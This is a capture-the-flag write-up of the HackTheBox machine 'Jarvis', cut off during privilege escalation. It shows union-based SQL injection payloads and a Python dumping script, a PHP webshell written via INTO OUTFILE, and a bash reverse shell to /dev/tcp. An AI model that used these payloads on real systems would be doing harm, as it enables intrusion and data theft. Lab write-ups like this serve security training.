# Jarvis

## Introduction

Welcome to my another writeup! In this HackTheBox [Jarvis](https://app.hackthebox.com/machines/Jarvis) machine, you'll learn: RCE via Union-based SQL injection with `Into outfile`, OS Command Injection, filter bypass, privilege escalation via misconfigurated `systemctl` SUID binary, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: www-data to pepper](#privilege-escalation)**
4. **[Privilege Escalation: pepper to root](#pepper-to-root)**
5. **[Conclusion](#conclusion)**

## Background

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Jarvis.png)

## Service Enumeration

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:18:53(HKT)]
└> export RHOSTS=10.10.10.143          
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:18:54(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN scanning/rustscan.txt
[...]
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzv4ZGiO8sDRbIsdZhchg+dZEot3z8++mrp9m0VjP6qxr70SwkE0VGu+GkH7vGapJQLMvjTLjyHojU/AcEm9MWTRWdpIrsUirgawwROic6HmdK2e0bVUZa8fNJIoyY1vPa4uNJRKZ+FNoT8qdl9kvG1NGdBl1+zoFbR9az0sgcNZJ1lZzZNnr7zv/Jghd/ZWjeiiVykomVRfSUCZe5qZ/aV6uVmBQ/mdqpXyxPIl1pG642C5j5K84su8CyoiSf0WJ2Vj8GLiKU3EXQzluQ8QJJPJTjj028yuLjDLrtugoFn43O6+IolMZZvGU9Man5Iy5OEWBay9Tn0UDSdjbSPi1X
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDW2OapO3Dq1CHlnKtWhDucQdl2yQNJA79qP0TDmZBR967hxE9ESMegRuGfQYq0brLSR8Xi6f3O8XL+3bbWbGQ=
|   256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPuKufVSUgOG304mZjkK8IrZcAGMm76Rfmq2by7C0Nmo
80/tcp    open  http    syn-ack Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    syn-ack Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**`nmap` UDP scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:18:59(HKT)]
└> sudo nmap -sU $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
PORT      STATE         SERVICE
657/udp   open|filtered rmc
944/udp   open|filtered unknown
989/udp   open|filtered ftps-data
1034/udp  open|filtered activesync-notify
1645/udp  open|filtered radius
1761/udp  open|filtered cft-0
1812/udp  open|filtered radius
3389/udp  open|filtered ms-wbt-server
5002/udp  open|filtered rfe
6001/udp  open|filtered X11:1
6347/udp  open|filtered gnutella2
16548/udp open|filtered unknown
16939/udp open|filtered unknown
17282/udp open|filtered unknown
17459/udp open|filtered unknown
17629/udp open|filtered unknown
17787/udp open|filtered unknown
17814/udp open|filtered unknown
18485/udp open|filtered unknown
18543/udp open|filtered unknown
19624/udp open|filtered unknown
19719/udp open|filtered unknown
20525/udp open|filtered unknown
20884/udp open|filtered unknown
21206/udp open|filtered unknown
21298/udp open|filtered unknown
21609/udp open|filtered unknown
21902/udp open|filtered unknown
22043/udp open|filtered unknown
22109/udp open|filtered unknown
24279/udp open|filtered unknown
30718/udp open|filtered unknown
32777/udp open|filtered sometimes-rpc18
37813/udp open|filtered unknown
42313/udp open|filtered unknown
49155/udp open|filtered unknown
49165/udp open|filtered unknown
49175/udp open|filtered unknown
49207/udp open|filtered unknown
50164/udp open|filtered unknown
```

According to `rustscan` and `nmap` result, we have 3 ports aire opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22/TCP            | OpenSSH 7.4p1 Debian          |
|80/TCP            | Apache httpd 2.4.25 ((Debian))|
|64999/TCP         | Apache httpd 2.4.25 ((Debian))|

### HTTP on TCP port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:20:44(HKT)]
└> echo "$RHOSTS jarvis.htb" | sudo tee -a /etc/hosts
10.10.10.143 jarvis.htb
```

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728182120.png)

**"Room & Suites" page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728183659.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728183713.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728183723.png)

In this page, we can book a hotel room. When we click one of the room, it'll send a GET request to `/room.php` with parameter `code`.

Hmm... **Maybe we can perform IDOR (Insecure Direct Object Reference), SQL injection??**

Let's keep enumerating the target machine, we'll check `/room.php` later.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728182534.png)

In the footer section, **there are 2 domains: `logger.htb`, `supersecurehotel.htb`.**

**Let's add them to `/etc/hosts`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:26:55(HKT)]
└> sudo nano /etc/hosts
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:27:06(HKT)]
└> tail -n 1 /etc/hosts
10.10.10.143 jarvis.htb logger.htb supersecurehotel.htb
```

We can also check those domains are referring to a different web application or not:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728183112.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728183121.png)

They're the same.

**Nikto scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:21:41(HKT)]
└> nikto -h http://jarvis.htb/
[...]
+ Server: Apache/2.4.25 (Debian)
[...]
+ /: Uncommon header 'ironwaf' found, with contents: 2.0.3.
[...]
+ /phpmyadmin/changelog.php: Uncommon header 'x-ob_mode' found, with contents: 1.
+ /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
[...]
+ /phpmyadmin/: phpMyAdmin directory found.
+ /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/
```

**In here, we see there's a weird response header called `ironwaf`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:28:49(HKT)]
└> httpx http://jarvis.htb/
HTTP/1.1 200 OK
[...]
IronWAF: 2.0.3
[...]
```

I Googled "IronWAF", and I accidentally spoilered myself lol.

Anyway, **our Nikto scan also found phpMyAdmin endpoint: `/phpmyadmin/`.**

**Fuzzing subdomains with `ffuf`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:32:55(HKT)]
└> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://jarvis.htb/ -H "Host: FUZZ.jarvis.htb" -fw 3014
[...]
:: Progress: [114441/114441] :: Job [1/1] :: 501 req/sec :: Duration: [0:04:22] :: Errors: 0 ::
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:39:19(HKT)]
└> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://logger.htb/ -H "Host: FUZZ.logger.htb" -fw 3014
:: Progress: [114441/114441] :: Job [1/1] :: 501 req/sec :: Duration: [0:04:22] :: Errors: 0 ::
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:39:19(HKT)]
└> ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://logger.htb/ -H "Host: FUZZ.logger.htb" -fw 3014
:: Progress: [114441/114441] :: Job [1/1] :: 501 req/sec :: Duration: [0:04:22] :: Errors: 0 ::
```

No subdomain.

**Content discovery via `gobuster`:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:23:44(HKT)]
└> gobuster dir -u http://jarvis.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 40
[...]
/index.php            (Status: 200) [Size: 23628]
/footer.php           (Status: 200) [Size: 2237]
[...]
/nav.php              (Status: 200) [Size: 1333]
/connection.php       (Status: 200) [Size: 0]
[...]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:25:17(HKT)]
└> gobuster dir -u http://jarvis.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40
[...]
/fonts                (Status: 301) [Size: 308] [--> http://jarvis.htb/fonts/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://jarvis.htb/phpmyadmin/]
/css                  (Status: 301) [Size: 306] [--> http://jarvis.htb/css/]
/images               (Status: 301) [Size: 309] [--> http://jarvis.htb/images/]
/js                   (Status: 301) [Size: 305] [--> http://jarvis.htb/js/]
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|18:26:33(HKT)]
└> gobuster dir -u http://jarvis.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 40 -x php,phpx,txt,config,conf,bak
[...]
```

Nothing interesting except `/phpmyadmin`, which was already found in Nikto scan.

**Speaking of phpMyAdmin, we can go to that endpoint and try weak credentials:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728184204.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728184216.png)

However, no common weak credentials work.

### HTTP on TCP port 64999

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|19:13:50(HKT)]
└> httpx http://jarvis.htb:64999
HTTP/1.1 200 OK
Date: Fri, 28 Jul 2023 11:13:52 GMT
Server: Apache/2.4.25 (Debian)
Last-Modified: Mon, 04 Mar 2019 02:10:40 GMT
ETag: "36-5833b43634c39"
Accept-Ranges: bytes
Content-Length: 54
IronWAF: 2.0.3
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

Hey you have been banned for 90 seconds, don't be bad
```

I've banned for 90 seconds?

I've enumerated everything I could think of in this port, no dice.

## Initial Foothold

Let's take a step back.

We can now investigate the `/room.php`.

**What if parameter `cod` is `0`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728184411.png)

It redirects me to `index.php`?

**How about `-1`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728184442.png)

Empty result?

So maybe no IDOR vulnerability in here.

How about SQL injection?

**When we provide an non-existence hotel room ID, it shows an empty room:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728192909.png)

**In here, we can try to use payload `7 OR 1=1-- -` to see what will happened:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728193116.png)

As you can see, it worked! This is because the backend parses parameter `cod`'s value into the raw SQL query without preparing it. Since `1=1` is always `True`, it'll should get the first hotel room result.

Now that we confirmed there's a SQL injection in `/room.php`, we can try to determine what is the type of SQL injection, like Union-based, blind-based.

**After some trial and error, I found that it's a Union-based SQL injection:**
```
/room.php?cod=7 UNION ALL SELECT 1,2,3,4,5,6,7-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728193529.png)

So, there are **7 columns**, and **column 2, 3, 5 is reflected** to the page.

**We can also check column 2, 3, 5 accept string data type or not:**
```
/room.php?cod=7 UNION ALL SELECT 1,'string2','string3',4,'string5',6,7-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728193713.png)

They can!

**After that, we can enumerate and exfiltrate the entire database!!**

**Enumerate DBMS (Database Management System):**

**After trying to show different DBMS version, MySQL's `@@version` works:**
```
/room.php?cod=7 UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728194038.png)

- DBMS: MariaDB 10.1.37

**Now, to automate things, I'll write a Python script:**
```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup

class Exploit:
    def __init__(self, url):
        self.url = url

    def enumerateDatabase(self, payload):
        print(f'[*] Payload: {payload}')
        sqliUrl = f'{self.url}{payload}'

        respond = requests.get(sqliUrl)
        soup = BeautifulSoup(respond.text, 'html.parser')
        payloadResult = soup.h3.get_text()
        isPayloadResultEmpty = True if len(payloadResult) == 0 else False
        if isPayloadResultEmpty:
            print(f'[-] No result :(')
            return False, payloadResult

        return True, payloadResult

if __name__ == '__main__':
    url = 'http://jarvis.htb/room.php?cod='
    exploit = Exploit(url)

    payload = "7 UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL-- -"
    isExploitSuccess, payloadResult = exploit.enumerateDatabase(payload)
    if not isExploitSuccess:
        print('[-] Exploit failed... Abort!!')
        exit()

    print(f'[+] Payload result: {payloadResult}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|19:50:14(HKT)]
└> python3 sql_injection_exploit.py
[*] Payload: 7 UNION ALL SELECT NULL,@@version,NULL,NULL,NULL,NULL,NULL-- -
[+] Payload result: 10.1.37-MariaDB-0+deb9u1
```

**Enumerate database names:**
```python
if __name__ == '__main__':
    url = 'http://jarvis.htb/room.php?cod='
    exploit = Exploit(url)

    for offsetPosition in range(100):
        payload = f"7 UNION ALL SELECT NULL,schema_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata LIMIT 1 OFFSET {offsetPosition}-- -"
        isExploitSuccess, payloadResult = exploit.enumerateDatabase(payload)
        if not isExploitSuccess:
            print('[-] Exploit failed... Abort!!')
            break

        print(f'[+] Payload result: {payloadResult}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|20:00:59(HKT)]
└> python3 sql_injection_exploit.py
[*] Payload: 7 UNION ALL SELECT NULL,schema_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata LIMIT 1 OFFSET 0-- -
[+] Payload result: hotel
[*] Payload: 7 UNION ALL SELECT NULL,schema_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata LIMIT 1 OFFSET 1-- -
[+] Payload result: information_schema
[*] Payload: 7 UNION ALL SELECT NULL,schema_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata LIMIT 1 OFFSET 2-- -
[+] Payload result: mysql
[*] Payload: 7 UNION ALL SELECT NULL,schema_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata LIMIT 1 OFFSET 3-- -
[+] Payload result: performance_schema
[*] Payload: 7 UNION ALL SELECT NULL,schema_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.schemata LIMIT 1 OFFSET 4-- -
[-] No result :(
[-] Exploit failed... Abort!!
```

- Database names: `hotel`, `information_schema`, `mysql`, `performance_schema`

Except for database `hotel`, everything else is default.

**Enumerate table names in database `hotel`:**
```python
if __name__ == '__main__':
    url = 'http://jarvis.htb/room.php?cod='
    exploit = Exploit(url)

    for offsetPosition in range(100):
        payload = f"7 UNION ALL SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='hotel' LIMIT 1 OFFSET {offsetPosition}-- -"
        isExploitSuccess, payloadResult = exploit.enumerateDatabase(payload)
        if not isExploitSuccess:
            print('[-] Exploit failed... Abort!!')
            break

        print(f'[+] Payload result: {payloadResult}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|20:01:41(HKT)]
└> python3 sql_injection_exploit.py
[*] Payload: 7 UNION ALL SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='hotel' LIMIT 1 OFFSET 0-- -
[+] Payload result: room
[*] Payload: 7 UNION ALL SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='hotel' LIMIT 1 OFFSET 1-- -
[-] No result :(
[-] Exploit failed... Abort!!
```

- Database `hotel` table names: `room`

**Enumerate database `hotel` table `room`'s column names:**
```python
if __name__ == '__main__':
    url = 'http://jarvis.htb/room.php?cod='
    exploit = Exploit(url)

    for offsetPosition in range(100):
        payload = f"7 UNION ALL SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='room' LIMIT 1 OFFSET {offsetPosition}-- -"
        isExploitSuccess, payloadResult = exploit.enumerateDatabase(payload)
        if not isExploitSuccess:
            print('[-] Exploit failed... Abort!!')
            break

        print(f'[+] Payload result: {payloadResult}')
```

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|20:02:49(HKT)]
└> python3 sql_injection_exploit.py
[*] Payload: 7 UNION ALL SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='room' LIMIT 1 OFFSET 0-- -
[+] Payload result: cod
[*] Payload: 7 UNION ALL SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='room' LIMIT 1 OFFSET 1-- -
[+] Payload result: name
[*] Payload: 7 UNION ALL SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='room' LIMIT 1 OFFSET 2-- -
[+] Payload result: price
[*] Payload: 7 UNION ALL SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='room' LIMIT 1 OFFSET 3-- -
[+] Payload result: descrip
[*] Payload: 7 UNION ALL SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='room' LIMIT 1 OFFSET 4-- -
[+] Payload result: star
[*] Payload: 7 UNION ALL SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='room' LIMIT 1 OFFSET 5-- -
[+] Payload result: image
[*] Payload: 7 UNION ALL SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='room' LIMIT 1 OFFSET 6-- -
[+] Payload result: mini
[*] Payload: 7 UNION ALL SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='room' LIMIT 1 OFFSET 7-- -
[-] No result :(
[-] Exploit failed... Abort!!
```

- Table `room` column names: `cod`, `name`, `price`, `descrip`, `star`, `image`, `mini`

**Exfiltrate all data from database `hotel` table `room`:**
```python
if __name__ == '__main__':
    url = 'http://jarvis.htb/room.php?cod='
    exploit = Exploit(url)

    for offsetPosition in range(100):
        payload = f"7 UNION ALL SELECT NULL,GROUP_CONCAT(cod,0x7c,name,0x7c,price,0x7c,descrip,0x7c,star,0x7c,image,0x7c,mini),NULL,NULL,NULL,NULL,NULL FROM room LIMIT 1 OFFSET {offsetPosition}-- -"
        isExploitSuccess, payloadResult = exploit.enumerateDatabase(payload)
        if not isExploitSuccess:
            print('[-] Exploit failed... Abort!!')
            break

        print(f'[+] Payload result: {payloadResult}')
```

> Note: Hex `0x7c` is character `|`.

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|20:05:03(HKT)]
└> python3 sql_injection_exploit.py
[*] Payload: 7 UNION ALL SELECT NULL,GROUP_CONCAT(cod,0x7c,name,0x7c,price,0x7c,descrip,0x7c,star,0x7c,image,0x7c,mini),NULL,NULL,NULL,NULL,NULL FROM room LIMIT 1 OFFSET 0-- -
[+] Payload result: 1|Superior Family Room|270|Superior room, perfect for luxury families.
Big room with a lot of extras||room-6.jpg| Perfect for traveling couples Breakfast included Price does not include VAT & services fee,2|Suite|149|Suite room is perfect||room-1.jpg| Only 10 rooms are available Breakfast included Price does not include VAT & services fee,3|Double Room|199|Perfect room for couples <3|
$

/ per night


Go to book!

[*] Payload: 7 UNION ALL SELECT NULL,GROUP_CONCAT(cod,0x7c,name,0x7c,price,0x7c,descrip,0x7c,star,0x7c,image,0x7c,mini),NULL,NULL,NULL,NULL,NULL FROM room LIMIT 1 OFFSET 1-- -
[-] No result :(
[-] Exploit failed... Abort!!
```

```
1|Superior Family Room|270|Superior room, perfect for luxury families.
Big room with a lot of extras||room-6.jpg| Perfect for traveling couples Breakfast included Price does not include VAT & services fee,
2|Suite|149|Suite room is perfect||room-1.jpg| Only 10 rooms are available Breakfast included Price does not include VAT & services fee,
3|Double Room|199|Perfect room for couples <3|
$

/ per night


Go to book!
```

Hmm... Nothing weird...

**Maybe we can write a PHP webshell via `Into outfile`?**
```
7 UNION SELECT NULL,"<?php system($_GET['cmd']); ?>",NULL,NULL,NULL,NULL,NULL into outfile "/var/www/html/webshell.php"-- -
```

> Note: The above payload is from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#into-outfile-method).

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Jarvis/images/Pasted%20image%2020230728201013.png)

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|20:10:16(HKT)]
└> curl http://jarvis.htb/webshell.php --get --data-urlencode "cmd=id"
\N	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	\N	\N	\N	\N	\N
```

Ah ha! we can!

**Let's get a reverse shell then!**

- **Setup a netcat listener:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|20:11:19(HKT)]
└> nc -lnvp 443
listening on [any] 443 ...
```

- **Send the reverse shell payload:** (Generated from [revshells.com](https://www.revshells.com/))

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|20:13:23(HKT)]
└> curl http://jarvis.htb/webshell.php --get --data-urlencode "cmd=/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.15/443 0>&1'"

```

- **Profit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|20:11:19(HKT)]
└> rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.143] 59998
[...]
www-data@jarvis:/var/www/html$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
www-data
jarvis
uid=33(www-data) gid=33(www-data) groups=33(www-data)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:71:d5 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.143/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:71d5/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `www-data`!

## Privilege Escalation

### www-data to pepper

Let's do some basic system enumerations!

**System users:**
```shell
www-data@jarvis:/var/www/html$ awk -F':' '{ if ($3 >= 1000 && $3 <= 60000) { print $1 } }' /etc/passwd
pepper
```

- System user: `pepper`

**MySQL credentials:**
```shell
www-data@jarvis:/var/www/html$ cat connection.php
<?php
$connection=new mysqli('127.0.0.1','DBadmin','{Redacted}','hotel');
?>
```

**SUID binaries:**
```shell
www-data@jarvis:/var/www/html$ find / -perm -4000 2>/dev/null
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

- Non-default SUID binary: `/bin/systemctl`

**Sudo permission:**
```shell
www-data@jarvis:/var/www/html$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

**Oh! We can run `/var/www/Admin-Utilities/simpler.py` as user `pepper` without password!**

**Listening ports:**
```shell
www-data@jarvis:/var/www/html$ netstat -tunlp
[...]
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::64999                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

Port 3306 (MySQL) is listening in localhost, but we already enumerated it via SQL injection.

**Cronjob:**
```shell
www-data@jarvis:/var/www/html$ ls -lah /etc/cron.d
ls -lah /etc/cron.d
total 16K
drwxr-xr-x  2 root root 4.0K Mar  2  2019 .
drwxr-xr-x 80 root root 4.0K May  9  2022 ..
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
-rw-r--r--  1 root root  712 Jan  1  2017 php
```

**Found a cronjob in `/etc/cron.d`:**
```shell
www-data@jarvis:/var/www/html$ cat /etc/cron.d/php
# /etc/cron.d/php@PHP_VERSION@: crontab fragment for PHP
#  This purges session files in session.save_path older than X,
#  where X is defined in seconds as the largest value of
#  session.gc_maxlifetime from all your SAPI php.ini files
#  or 24 minutes if not defined.  The script triggers only
#  when session.save_handler=files.
#
#  WARNING: The scripts tries hard to honour all relevant
#  session PHP options, but if you do something unusual
#  you have to disable this script and take care of your
#  sessions yourself.

# Look for and purge old sessions every 30 minutes
09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
```

Looks like it just clean all old sessions every 30 minutes?

Armed with above information, we can try to escalate our privilege to user `pepper`.

**I tried to SSH user `pepper` with MySQL user's password, but no password reuse:**
```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Jarvis)-[2023.07.28|20:23:11(HKT)]
└> ssh pepper@$RHOSTS
[...]
pepper@10.10.10.143's password: 
Permission denied, please try again.
```

Then, we can try to abuse the Sudo permission.

**`/var/www/Admin-Utilities/simpler.py`:**
```shell
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
